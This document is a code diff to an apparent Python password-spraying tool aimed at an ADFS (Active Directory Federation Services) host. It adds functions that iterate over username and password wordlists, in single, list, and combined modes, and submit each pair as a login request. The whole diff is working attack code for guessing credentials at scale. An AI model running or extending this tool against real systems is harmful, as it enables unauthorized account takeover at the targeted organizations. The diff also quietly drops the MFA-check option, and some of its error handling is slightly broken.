@@ -114,7 +114,82 @@ def send_request(
         print(f"{Fore.RED}[!] Error occurred: {e}{Style.RESET_ALL}")
 
 
-# ... (previous code)
+def single_username_single_password(target, username, password, verbose, log_file):
+    send_request(target, username, password, verbose=verbose, log_file=log_file)
+
+
+def single_username_password_list(
+    target, username, password_list_file, verbose, log_file
+):
+    try:
+        with open(password_list_file, "r") as file:
+            for password in file:
+                send_request(
+                    target,
+                    username,
+                    password.strip(),
+                    verbose=verbose,
+                    log_file=log_file,
+                )
+    except FileNotFoundError:
+        print(f"{Fore.RED}[!] File '{password_list_file}' not found.{Style.RESET_ALL}")
+    except IOError as e:
+        print(
+            f"{Fore.RED}[!] Error occurred while reading the file: {e}{Style.RESET_ALL}"
+        )
+
+
+def username_list_single_password(
+    target, username_list_file, password, verbose, log_file
+):
+    try:
+        with open(username_list_file, "r") as file:
+            for username in file:
+                send_request(
+                    target,
+                    username.strip(),
+                    password,
+                    verbose=verbose,
+                    log_file=log_file,
+                )
+    except FileNotFoundError:
+        print(
+            f"{Fore.RED}[!] Username list file '{username_list_file}' not found.{Style.RESET_ALL}"
+        )
+    except IOError as e:
+        print(
+            f"{Fore.RED}[!] Error occurred while reading the file: {e}{Style.RESET_ALL}"
+        )
+
+
+def username_list_password_list(
+    target, username_list_file, password_list_file, verbose, log_file
+):
+    try:
+        with open(username_list_file, "r") as users:
+            user_list = users.read().splitlines()
+        with open(password_list_file, "r") as passwords:
+            password_list = passwords.read().splitlines()
+
+        for username in user_list:
+            for password in password_list:
+                send_request(
+                    target,
+                    username.strip(),
+                    password.strip(),
+                    verbose=verbose,
+                    log_file=log_file,
+                )
+    except FileNotFoundError:
+        if not username_list_file:
+            print(f"{Fore.RED}[!] Username list file not provided.{Style.RESET_ALL}")
+        if not password_list_file:
+            print(f"{Fore.RED}[!] Password list file not provided.{Style.RESET_ALL}")
+    except IOError as e:
+        print(
+            f"{Fore.RED}[!] Error occurred while reading the file: {e}{Style.RESET_ALL}"
+        )
+
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(
@@ -202,40 +277,18 @@ if __name__ == "__main__":
     print(f"{Fore.CYAN}[*] Target ADFS Host: {target}{Style.RESET_ALL}")
 
     if username and password:
-        send_request(
-            target,
-            username,
-            password,
-            verbose=verbose,
-            log_file=log_file,
-            check_mfa=check_mfa,
-        )
+        single_username_single_password(target, username, password, verbose, log_file)
     elif username and password_list_file:
-        send_request(
-            target,
-            username,
-            password_list_file,
-            verbose=verbose,
-            log_file=log_file,
-            check_mfa=check_mfa,
+        single_username_password_list(
+            target, username, password_list_file, verbose, log_file
         )
     elif username_list_file and password:
-        send_request(
-            target,
-            username_list_file,
-            password,
-            verbose=verbose,
-            log_file=log_file,
-            check_mfa=check_mfa,
+        username_list_single_password(
+            target, username_list_file, password, verbose, log_file
         )
     elif username_list_file and password_list_file:
-        send_request(
-            target,
-            username_list_file,
-            password_list_file,
-            verbose=verbose,
-            log_file=log_file,
-            check_mfa=check_mfa,
+        username_list_password_list(
+            target, username_list_file, password_list_file, verbose, log_file
         )
     else:
         print(
